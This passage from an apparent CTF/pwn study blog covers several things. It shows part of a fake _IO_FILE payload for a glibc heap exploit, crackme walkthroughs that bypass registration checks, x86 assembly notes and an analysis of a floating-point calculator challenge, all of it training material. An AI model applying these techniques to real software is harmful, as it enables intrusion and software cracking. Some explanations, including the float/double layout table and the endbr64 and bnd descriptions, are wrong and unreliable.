class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure><h1 id="任务Ⅳ"><a href="#任务Ⅳ" class="headerlink" title="任务Ⅳ"></a>任务Ⅳ</h1><h2 id="Brad-Soblesky-1"><a href="#Brad-Soblesky-1" class="headerlink" title="Brad Soblesky.1"></a>Brad Soblesky.1</h2><p>随便输入一些东西,有字符串提示那就好办了</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-08-16_162131.png" alt=""></p><p>跟随查找字符串,同时发现一串怪的字符串,猜测是明文比较</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-08-16_162424.png" alt=""></p><p>跟随进入</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-08-16_162630.png" alt=""></p><p>在距离最近的关键跳转处打上断点,运行发现此处跳转实现</p><p>将其nop即可</p><p>并且尝试将<BrD-SoB>作为注册码,发现确实是明文</p><h2 id="Brad-Soblesky-2"><a href="#Brad-Soblesky-2" class="headerlink" title="Brad Soblesky.2"></a>Brad Soblesky.2</h2><p>暴力破解的话跟随字符串</p><p>找到最近的跳转,将其nop即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00401642  |. /0F85 FF000000 jnz Brad_Sob.00401747</span><br><span class="line">00401648  |. |8D8D ACFEFFFF lea ecx,[local.85]</span><br><span class="line">0040164E  |. |E8 19070000   call &lt;jmp.&amp;MFC42.#540&gt;</span><br><span class="line">00401653  |. |C645 FC 03    mov byte ptr ss:[ebp-0x4],0x3</span><br><span class="line">00401657  |. |6A 66         push 0x66</span><br><span class="line">00401659  |. |8D8D ACFEFFFF lea ecx,[local.85]</span><br><span class="line">0040165F  |. |E8 02070000   call &lt;jmp.&amp;MFC42.#4160&gt;</span><br><span class="line">00401664  |. |B9 07000000   mov ecx,0x7</span><br><span class="line">00401669  |. |BE 58404000   mov esi,Brad_Sob.00404058                ;  Correct!!</span><br></pre></td></tr></table></figure><p>算法方面</p><p>根据字符串00404028=Brad_Sob.00404028 (ASCII “User Name must have at least 5 characters.”)</p><p>可以定位到check事件函数段首004014DF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">00401579  |. /7D 43         jge short Brad_Sob.004015BE</span><br><span class="line">0040157B  |. |6A 40         push 0x40</span><br><span class="line">0040157D  |. |68 20404000   push Brad_Sob.00404020                   ;  CrackMe</span><br><span class="line">00401582  |. |68 28404000   push Brad_Sob.00404028                   ;  User Name must have at least 5 characters.</span><br><span class="line">00401587  |. |8B8D 40FEFFFF mov ecx,[local.112]</span><br><span class="line">0040158D  |. |E8 F2070000   call &lt;jmp.&amp;MFC42.#4224&gt;</span><br><span class="line">00401592  |. |C645 FC 01    mov byte ptr ss:[ebp-0x4],0x1</span><br><span class="line">00401596  |. |8D4D DC       lea ecx,[local.9]</span><br><span class="line">00401599  |. |E8 C2070000   call &lt;jmp.&amp;MFC42.#800&gt;</span><br><span class="line">0040159E  |. |C645 FC 00    mov byte ptr ss:[ebp-0x4],0x0</span><br><span class="line">004015A2  |. |8D4D E8       lea ecx,[local.6]</span><br><span class="line">004015A5  |. |E8 B6070000   call &lt;jmp.&amp;MFC42.#800&gt;</span><br><span class="line">004015AA  |. |C745 FC FFFFF&gt;mov [local.1],-0x1</span><br><span class="line">004015B1  |. |8D4D EC       lea ecx,[local.5]</span><br><span class="line">004015B4  |. |E8 A7070000   call &lt;jmp.&amp;MFC42.#800&gt;</span><br><span class="line">004015B9  |. |E9 F9010000   jmp Brad_Sob.004017B7</span><br><span class="line">004015BE  |&gt; \C745 E0 00000&gt;mov [local.8],0x0</span><br><span class="line">004015C5  |.  EB 09         jmp short Brad_Sob.004015D0</span><br><span class="line">004015C7  |&gt;  8B55 E0       /mov edx,[local.8]</span><br><span class="line">004015CA  |.  83C2 01       |add edx,0x1</span><br><span class="line">004015CD  |.  8955 E0       |mov [local.8],edx                       ;  Brad_Sob.&lt;ModuleEntryPoint&gt;</span><br></pre></td></tr></table></figure><p>在跳过长度校验后,下断点在0x4015be</p><p>根据ebp找到我们输入的数据</p><p>再往下就是注册码校验</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">004015BE  |&gt; \C745 E0 00000&gt;mov [local.8],0x0</span><br><span class="line">004015C5  |.  EB 09         jmp short Brad_Sob.004015D0</span><br><span class="line">004015C7  |&gt;  8B55 E0       /mov edx,[local.8]</span><br><span class="line">004015CA  |.  83C2 01       |add edx,0x1</span><br><span class="line">004015CD  |.  8955 E0       |mov [local.8],edx</span><br><span class="line">004015D0  |&gt;  8B45 E0        mov eax,[local.8]</span><br><span class="line">004015D3  |.  3B45 E4       |cmp eax,[local.7]</span><br><span class="line">004015D6  |.  7D 42         |jge short Brad_Sob.0040161A</span><br><span class="line">004015D8  |.  8B4D E0       |mov ecx,[local.8]</span><br><span class="line">004015DB  |.  51            |push ecx</span><br><span class="line">004015DC  |.  8D4D EC       |lea ecx,[local.5]</span><br><span class="line">004015DF  |.  E8 1C030000   |call Brad_Sob.00401900</span><br><span class="line">004015E4  |.  0FBED0        |movsx edx,al</span><br><span class="line">004015E7  |.  8B45 F0       |mov eax,[local.4]</span><br><span class="line">004015EA  |.  03C2          |add eax,edx</span><br><span class="line">004015EC  |.  8945 F0       |mov [local.4],eax</span><br><span class="line">004015EF  |.  8B4D E0       |mov ecx,[local.8]</span><br><span class="line">004015F2  |.  C1E1 08       |shl ecx,0x8</span><br><span class="line">004015F5  |.  8B55 F0       |mov edx,[local.4]</span><br><span class="line">004015F8  |.  33D1          |xor edx,ecx</span><br><span class="line">004015FA  |.  8955 F0       |mov [local.4],edx</span><br><span class="line">004015FD  |.  8B45 E0       |mov eax,[local.8]</span><br><span class="line">00401600  |.  83C0 01       |add eax,0x1</span><br><span class="line">00401603  |.  8B4D E4       |mov ecx,[local.7]</span><br><span class="line">00401606  |.  0FAF4D E0     |imul ecx,[local.8]</span><br><span class="line">0040160A  |.  F7D1          |not ecx</span><br><span class="line">0040160C  |.  0FAFC1        |imul eax,ecx</span><br><span class="line">0040160F  |.  8B55 F0       |mov edx,[local.4]</span><br><span class="line">00401612  |.  0FAFD0        |imul edx,eax</span><br><span class="line">00401615  |.  8955 F0       |mov [local.4],edx</span><br><span class="line">00401618  |.^ EB AD         \jmp short Brad_Sob.004015C7</span><br><span class="line">0040161A  |&gt;  8B45 F0       mov eax,[local.4]</span><br></pre></td></tr></table></figure><p>自己读有点费神,ida看一看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = sub_401900(i);</span><br><span class="line">    v18 += v1;</span><br><span class="line">    v18 ^= i &lt;&lt; <span class="number">8</span>;</span><br><span class="line">    v18 *= ~(i * v15) * (i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>直接把算法整出来了</p><h2 id="chafe"><a href="#chafe" class="headerlink" title="chafe"></a>chafe</h2><p>环境有点问题,无法输入一输入就卡住,调试也是</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> SunmerWeek2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编小记</title>
      <link href="/posts/65020/"/>
      <url>/posts/65020/</url>
      
        <content type="html"><![CDATA[<h1 id="指令相关"><a href="#指令相关" class="headerlink" title="指令相关"></a>指令相关</h1><h2 id="movabs"><a href="#movabs" class="headerlink" title="movabs"></a>movabs</h2><p>在x86-64架构下想要加载一个64位的立即数，应该使用 movabs 指令，而不是 mov 指令，以确保立即数被正确加载到64位寄存器中。</p><p>当将64位的立即数赋值给寄存器时</p><p>应该这样写<code>movabs &lt;寄存器&gt;, &lt;立即数&gt;</code></p><p>不过写mov影响也不大,因为编译后会自动处理为movabs</p><h2 id="movzx-amp-movsx"><a href="#movzx-amp-movsx" class="headerlink" title="movzx&amp;movsx"></a>movzx&amp;movsx</h2><p><code>movzx</code>用于将一个较小的无符号数（通常是8位或16位）从一个寄存器复制到另一个较大的寄存器，并在高位补零。</p><p>这个指令通常用于将无符号数扩展到较大的寄存器中，以便进行后续的运算，避免出现符号位扩展的问题。</p><p>例如，x86 架构中的 <code>movzx</code> 可以这样使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assemblyCopy code</span><br><span class="line">movzx eax, byte ptr [ebx]</span><br></pre></td></tr></table></figure><p>这条指令会将存储在 <code>ebx</code> 寄存器指向的内存地址中的一个8位无符号数值复制到 <code>eax</code> 寄存器，并将 <code>eax</code> 的高位补零，将其扩展为32位。这样，<code>eax</code> 中的值将是一个无符号的32位整数。</p><p><code>movsx</code>是<code>movsx</code>的有符号对应指令</p><h2 id="cdqe-amp-cdq"><a href="#cdqe-amp-cdq" class="headerlink" title="cdqe&amp;cdq"></a>cdqe&amp;cdq</h2><p><code>cdqe</code> 和 <code>cdq</code> 是x86-64架构（amd64）中的指令，用于对寄存器进行符号扩展，特别是在从32位寄存器到64位寄存器的数据传送中。</p><ol><li><p><strong><code>cdqe</code> 指令</strong>：</p><ul><li><code>cdqe</code> 用于从32位寄存器 <code>eax</code> 扩展到64位寄存器 <code>rax</code>。它执行符号扩展，即将 <code>eax</code> 的符号位（即最高位）复制到 <code>rax</code> 的高位，使得 <code>rax</code> 的高32位与 <code>eax</code> 的值保持一致。</li><li>在32位代码中，通常使用 <code>cdqe</code> 来将有符号的32位整数符号扩展为64位整数，以便继续在64位寄存器中进行操作。</li></ul><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, -123   ; 将一个有符号的32位整数 -123 赋值给 eax</span><br><span class="line">cdqe            ; 将 eax 符号扩展到 rax，此时 rax 的值为 (0xFFFFFFFFFFFFFF85）</span><br></pre></td></tr></table></figure></li><li><p><strong><code>cdq</code> 指令</strong>：</p><ul><li><code>cdq</code> 用于从32位寄存器 <code>eax</code> 扩展到64位寄存器组合 <code>edx:eax</code>。它执行符号扩展，即将 <code>eax</code> 的符号位（即最高位）复制到 <code>edx</code> 的所有位，使得 <code>edx</code> 全部填充为 <code>eax</code> 的符号位。</li><li>在32位代码中，通常使用 <code>cdq</code> 来将有符号的32位整数符号扩展为64位整数的组合（即<code>edx:eax</code>），以便进行64位整数运算。</li></ul><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, -123   ; 将一个有符号的32位整数 -123 赋值给 eax</span><br><span class="line">cdq             ; 将 eax 符号扩展到 edx:eax，此时 edx 的值全部为 0xFFFFFFF（-1）</span><br></pre></td></tr></table></figure></li></ol><h1 id="高位清空机制"><a href="#高位清空机制" class="headerlink" title="高位清空机制"></a>高位清空机制</h1><p>intel规定,对通用寄存器低32位操作会导致高32位清零，对低16位、8位操作则对高位无影响</p><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x888  ;会导致rax高32位清零</span><br><span class="line">mov ax,0x88    ;不会导致rax高32位清零</span><br><span class="line">mov al,0x8     ;不导致rax高32位清零</span><br></pre></td></tr></table></figure><h1 id="bnd"><a href="#bnd" class="headerlink" title="bnd"></a>bnd</h1><p>在汇编中,经常能看到jmp指令前有一个bnd标识符</p><p>在汇编语言中，<code>bnd</code> 指令通常用于设置边界检查，以确保内存访问不会超出指定的边界。<code>bnd</code> 指令通常与条件跳转指令（如 <code>jmp</code>）一起使用，以实现在特定条件下跳转到目标地址。</p><p>具体来说，<code>bnd</code> 指令可以用来设置内存操作的边界检查条件。如果边界检查条件失败，那么跳转指令（如 <code>jmp</code>）可能不会执行跳转，从而防止越界访问。</p><h1 id="endbr32-amp-amp-endbr64"><a href="#endbr32-amp-amp-endbr64" class="headerlink" title="endbr32&amp;&amp;endbr64"></a>endbr32&amp;&amp;endbr64</h1><p>参考文章<a href="https://cs.pynote.net/hd/asm/202302172/">endbr64指令（x64） | CS笔记 (pynote.net)</a></p><p>在代码段的开头有一条指令出现频率非常高,就是endbr64</p><p>该指令是Intel CET（Control flow Enforcement Technology）技术的一部分</p><blockquote><p>Intel CET offers hardware protection against Return-oriented Programming (ROP) and Jump/Call-oriented Programming (JOP/COP) attacks, which manipulate control flow in order to <code>re-use existing code for malicious purposes</code>.</p><p>Its two major features are:</p><ul><li>a <strong>shadow stack</strong> for tracking return addresses and</li><li><strong>indirect branch tracking</strong>, which <strong>endbr64</strong> is a part of.</li></ul><p>The opcode is chosen to be a NOP on older processors, such that the instruction is ignored if CET is not supported, the same happens on CET-capable processors where indirect branch tracking is disabled.</p><p><strong>So what does endbr64 do?</strong></p><p>Preconditions:</p><ul><li>CET must be enabled by setting the control register flag CR4.CET to 1.</li><li>The appropriate flags for indirect branch tracking in the IA32_U_CET (user mode) or IA32_S_CET (supervisor mode) MSRs are set.</li></ul></blockquote><hr><blockquote><p>how endbr64 works?</p><p>endbr64 is an x86-64 instruction that is used as part of Control Flow Enforcement Technology (CET), which is a security feature designed to mitigate certain types of attacks such as Return Oriented Programming (ROP) and Jump Oriented Programming (JOP).</p><p>The basic idea behind CET is to create shadow stacks that keep track of the call site addresses using a separate stack from the regular call stack. This can help detect when an attacker tries to redirect program execution by overwriting the return address on the regular call stack.</p><p>However, there is still a vulnerability in this approach: an attacker could potentially use gadgets that don’t include a ret instruction at the end, preventing the shadow stack from being updated properly. In other words, an attacker could subvert the control-flow enforcement mechanism by using a gadget to jump directly to another gadget without actually returning to the original code.</p><p>This is where endbr64 comes in. It is used to mark the end of a branch instruction sequence (such as a jmp or call) and ensures that the shadow stack is updated even if the branch doesn’t end with a ret. The endbr64 instruction is placed immediately after the branch instruction and signals to the processor that the branch has ended and that the shadow stack should be updated accordingly.</p><p>In summary, endbr64 is a security feature designed to complement Control Flow Enforcement Technology (CET) by ensuring that the shadow stack is correctly updated even in the presence of branches that do not end with a ret instruction. This helps to prevent attacks such as ROP and JOP that attempt to hijack program execution by manipulating the control flow of the program.</p></blockquote><p>CET 通过编译器在合理的间接跳转 <strong>(call/jmp)</strong> 中用新的指令做标记，新指令包含 endbr32 和 endbr64。程序每次执行跳转时，CPU 都会判断下一条指令是不是 endbr32/endbr64 指令，如果是则正常执行，如果不是，则会触发 #CP 异常。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> asm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SunmerWeek4</title>
      <link href="/posts/33109/"/>
      <url>/posts/33109/</url>
      
        <content type="html"><![CDATA[<h1 id="任务Ⅰ"><a href="#任务Ⅰ" class="headerlink" title="任务Ⅰ"></a>任务Ⅰ</h1><h2 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h2><h3 id="浮点数在内存中的存储"><a href="#浮点数在内存中的存储" class="headerlink" title="浮点数在内存中的存储"></a>浮点数在内存中的存储</h3><p>在计算机中，浮点数表示方式采用了<strong>IEEE 754</strong>标准。IEEE 754定义了浮点数的二进制表示规范，它规定了浮点数的位数、指数位数、小数位数等。</p><div class="table-container"><table><thead><tr><th></th><th>符号位</th><th>指数位</th><th>小数位</th></tr></thead><tbody><tr><td>float</td><td>1位</td><td>11位(偏移1023)</td><td>52位</td></tr><tr><td>double</td><td>1位</td><td>8位(偏移127)</td><td>23位</td></tr></tbody></table></div><p>具体的存储方式为：</p><ol><li>符号位：用于表示浮点数的正负号，0表示正数，1表示负数。</li><li>指数位：用于表示浮点数的指数部分。采用”偏移量表示法”，即指数的实际值等于存储的值减去一个偏移量，这样可以使指数既有正数又有负数的表示范围。</li><li>小数位：用于表示浮点数的小数部分。</li></ol><p><strong>具体的转换过程如下：</strong></p><ol><li>将浮点数转换为二进制科学计数法：将浮点数表示为M乘以2的E次方的形式。<strong>其中M是一个大于等于1且小于2的小数（隐藏了最高位的1）</strong>，E是整数。</li><li>根据科学计数法，将M和E转换为二进制表示。</li><li>将符号位、指数位、和小数位组合在一起形成64位二进制数，即双精度浮点数的内存表示。</li></ol><p>举个例子，我们将<code>3.14</code>转换成双精度浮点数(double)的二进制表示：</p><ol><li><code>3.14</code>的二进制科学计数法为<code>1.570*2^1</code>，其中<code>1.570</code>是小数部分，<code>2^1</code>是2的1次方，即2。</li><li><code>1.570</code>的二进制表示是<code>1.1010001001100110011001100110011001100110011001101</code>。</li><li><code>2</code>的二进制表示是<code>10</code>。</li></ol><p>现在将符号位、指数位、和小数位组合在一起：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">符号位: 0 (表示正数)</span><br><span class="line">指数位: 1023 + 1 = 1024，对应的二进制表示是：`10000000000`</span><br><span class="line">小数位: `1010001001100110011001100110011001100110011001101`</span><br></pre></td></tr></table></figure><p>将它们放在一起：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 10000000000 1010001001100110011001100110011001100110011001101</span><br></pre></td></tr></table></figure><p><strong>NaN:</strong></p><p>在IEEE 754浮点数标准中，NaN（Not a Number）是一种特殊的浮点数表示，用于表示非法的或未定义的操作的结果。NaN不是一个具体的数字，而是一种特殊的标记。</p><p><code>01111111111  1111 1111 1111 1111 1111 1111 1111 1111</code></p><p>满足</p><div class="table-container"><table><thead><tr><th>Comparison</th><th>NaN ≥ <em>x</em></th><th>NaN ≤ <em>x</em></th><th>NaN &gt; <em>x</em></th><th>NaN &lt; <em>x</em></th><th>NaN = <em>x</em></th><th>NaN ≠ <em>x</em></th></tr></thead><tbody><tr><td>Result</td><td>False</td><td>False</td><td>False</td><td>False</td><td>False</td><td>True</td></tr></tbody></table></div><p>且NaN!=NaN是成立的</p><p><strong>小数转二进制</strong></p><p>例如，我们要将十进制数0.625转换为二进制表示：</p><ol><li>0.625的整数部分为0，保留小数部分。</li><li>将0.625乘以2，得到1.25。整数部分为1，保留小数部分0.25。</li><li>再将0.25乘以2，得到0.5。整数部分为0，保留小数部分0.5。</li><li>继续将0.5乘以2，得到1.0。整数部分为1，没有小数部分，结束。</li></ol><p>将每次得到的整数部分依次排列起来，就得到了0.625的二进制表示：0.101。</p><p>对于无限不循环小数（如π、e等），在计算机中是无法完全表示的，因为计算机的内存是有限的。因此，对于这些无限不循环小数，计算机只能使用有限的位数来表示，导致了一定的精度损失。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>checksec</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/aichch/pwn/fcalc&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>发现自己总是静不下心来看这些代码相对比较复杂的题目😫</p><p>程序实现了一个浮点数的计算器</p><hr><p><strong>一个小坑:</strong></p><p>看ida反编译的变量声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line"><span class="type">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line"><span class="type">double</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">_BYTE v6[<span class="number">12</span>]; <span class="comment">// [rsp+8h] [rbp-50h] BYREF</span></span><br><span class="line"><span class="type">int</span> v7; <span class="comment">// [rsp+14h] [rbp-44h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-40h]</span></span><br><span class="line"><span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-3Ch]</span></span><br><span class="line"><span class="type">double</span> *v10; <span class="comment">// [rsp+20h] [rbp-38h]</span></span><br><span class="line"><span class="type">void</span> *s; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line"><span class="type">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line"><span class="type">double</span> v13; <span class="comment">// [rsp+38h] [rbp-20h]</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v14; <span class="comment">// [rsp+40h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">v3 = alloca(<span class="number">400LL</span>);</span><br><span class="line">s = v6;<span class="comment">//!!!</span></span><br><span class="line">v4 = alloca(<span class="number">64LL</span>);</span><br><span class="line">buf = v6;<span class="comment">//!!!</span></span><br><span class="line"><span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">0x180</span>uLL);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br></pre></td></tr></table></figure><p>注意标记了感叹号那里</p><p>看起来似乎s和buf的值是相同的</p><p>但实际上他们前面都有调用<strong>alloca</strong>,导致栈指针发生了对应的变化</p><p>v6的存在有些怪异,看看v6是如何传递给s和buf的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001648 48 89 E0                      mov     rax, rsp</span><br><span class="line">.text:000000000000164B 48 83 C0 0F                   add     rax, 0Fh</span><br><span class="line">.text:000000000000164F 48 C1 E8 04                   shr     rax, 4</span><br><span class="line">.text:0000000000001653 48 C1 E0 04                   shl     rax, 4</span><br><span class="line">.text:0000000000001657 48 89 45 D0                   mov     [rbp+s], rax</span><br></pre></td></tr></table></figure><p>rsp赋值给rax并进行对齐操作再复制给s和buf</p><p>实际上s和buf存储的值并不相同</p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *((<span class="type">char</span> *)buf + i) &lt;= <span class="number">32</span> || *((<span class="type">char</span> *)buf + i) &gt; <span class="number">48</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *((<span class="type">char</span> *)buf + i) &gt; <span class="number">47</span> &amp;&amp; *((<span class="type">char</span> *)buf + i) &lt;= <span class="number">57</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_4010 &gt; <span class="number">47</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ++dword_4010;</span><br><span class="line">    v5 = (<span class="type">double</span> *)qword_40E0;</span><br><span class="line">    *v5 = atof((<span class="type">const</span> <span class="type">char</span> *)buf + i);</span><br><span class="line">    qword_40E0 += <span class="number">8LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( *((_BYTE *)buf + i + <span class="number">1</span>) == <span class="number">46</span> || *((<span class="type">char</span> *)buf + i + <span class="number">1</span>) &gt; <span class="number">47</span> &amp;&amp; *((<span class="type">char</span> *)buf + i + <span class="number">1</span>) &lt;= <span class="number">57</span> )</span><br><span class="line">      ++i;<span class="comment">//for a complete number</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符等于空格或者<strong>大于零</strong>的数字才进入这个if线,但只有数字会继续进入实际有操作的if线</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4010 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = (<span class="type">double</span> *)s;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="built_in">fabs</span>(*v10);</span><br><span class="line">    <span class="keyword">if</span> ( v13 != <span class="number">0.0</span> &amp;&amp; (v13 &lt; <span class="number">1.0</span> || v13 &gt; <span class="number">100.0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, v13);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v10;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))qword_4060[*((<span class="type">char</span> *)buf + i) - <span class="number">32</span>])();<span class="comment">// excute</span></span><br><span 